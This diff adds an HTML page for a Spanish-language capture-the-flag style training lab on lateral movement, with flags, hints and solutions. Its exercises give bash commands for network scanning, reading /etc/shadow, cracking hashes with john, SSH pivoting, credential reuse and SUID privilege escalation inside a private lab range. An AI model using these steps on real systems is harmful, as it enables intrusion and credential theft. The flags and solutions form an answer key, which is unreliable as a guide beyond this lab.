@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔄 Lab lateral-01: Movimiento Lateral — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+    <script>
+    const LAB_CONFIG = {
+        id: 'lateral-01', name: 'Movimiento Lateral', subtitle: 'Navega entre hosts con pivoting y credenciales',
+        icon: '🔄', difficulty: 'intermedio', totalXP: 350, time: '60 min',
+        exercises: [
+            { title: 'Enumeración de Red', xp: 40, objective: 'Descubre hosts y servicios desde el Jump Box.', steps: ['Conectate al jump box', 'Enumera la red interna', 'Busca credenciales'], code: '$ ssh lowuser@10.0.6.10\n$ nmap -sn 10.0.6.0/24\n$ cat /etc/passwd | grep -v nologin', codeLang: 'bash', flag: 'FLAG{3_hosts_discovered}', hint: 'Hay 3 hosts en la red: Jump Box (.10), Web Server (.20), DB Server (.30).', solution: '3 hosts descubiertos. Usuarios: lowuser, webuser, dbuser.' },
+            { title: 'Extracción de Hashes', xp: 50, objective: 'Obtén hashes de usuarios para Pass-the-Hash.', steps: ['Lee /etc/shadow', 'Formatea los hashes', 'Crackea con john'], code: '$ sudo cat /etc/shadow\n$ awk -F: \'$2 != "!" {print $1":"$2}\' /etc/shadow > hashes.txt\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', codeLang: 'bash', flag: 'FLAG{hashes_cracked}', hint: 'Usa sudo para leer /etc/shadow. john crackea hashes con wordlists.', solution: 'Hashes extraídos y crackeados. Contraseñas: lowuser123, webuser123, dbuser123.' },
+            { title: 'SSH Pivot', xp: 50, objective: 'Usa el Jump Box como pivote para alcanzar otros hosts.', steps: ['Crea un SSH tunnel', 'Accede al web server a través del tunnel', 'Verifica conectividad'], code: '$ ssh -L 8080:10.0.6.20:80 lowuser@10.0.6.10\n$ curl http://localhost:8080\n$ ssh -J lowuser@10.0.6.10 webuser@10.0.6.20', codeLang: 'bash', flag: 'FLAG{ssh_pivot_working}', hint: 'ssh -L crea un port forward. ssh -J usa el jump host como proxy.', solution: 'SSH tunnel funcional. Web server accesible a través del jump box.' },
+            { title: 'Movimiento entre Hosts', xp: 60, objective: 'Muévete entre hosts usando credenciales reutilizadas.', steps: ['Conectate al web server', 'Enumera desde ahí', 'Conectate al DB server'], code: '$ ssh webuser@10.0.6.20  # password: webuser123\n$ ssh dbuser@10.0.6.30   # password: dbuser123\n$ cat /home/dbuser/flag.txt', codeLang: 'bash', flag: 'FLAG{creds_reused_across_hosts}', hint: 'Las credenciales se reutilizan entre hosts. webuser123 y dbuser123 funcionan.', solution: 'Movimiento lateral completado. Credenciales reutilizadas entre 3 hosts.' },
+            { title: 'Root en DB Server', xp: 60, objective: 'Escala a root en el último host.', steps: ['Enumera binaries SUID', 'Encuentra el binary vulnerable', 'Ejecuta para escalar'], code: '$ find / -perm -4000 2>/dev/null\n$ /usr/local/bin/db-admin\n# whoami → root\n# cat /root/flag.txt', codeLang: 'bash', flag: 'FLAG{root_on_db_server}', hint: 'Busca binaries SUID con find -perm -4000. /usr/local/bin/db-admin da root.', solution: 'Root obtenido via SUID binary db-admin. Flag final capturada.' },
+            { title: 'Documentación', xp: 40, objective: 'Documenta la ruta completa de movimiento lateral.', steps: ['Crea el reporte', 'Incluye topología de red', 'Documenta credenciales y flags'], code: '## Ruta: Kali → Jump Box → Web Server → DB Server → Root\n## Creds: lowuser:lowuser123, webuser:webuser123, dbuser:dbuser123\n## Flags: FLAG{l4t3r4l_m0v3m3nt_pwn3d}', codeLang: 'markdown', flag: 'FLAG{lateral_movement_documented}', hint: 'El reporte debe incluir: topología, ruta, credenciales, flags, recomendaciones.', solution: 'Reporte completo documentando toda la cadena de movimiento lateral.' }
+        ]
+    };
+    document.addEventListener('DOMContentLoaded', () => { CDPN_LabRunner.init(LAB_CONFIG); });
+    </script>
+</body>
+</html>
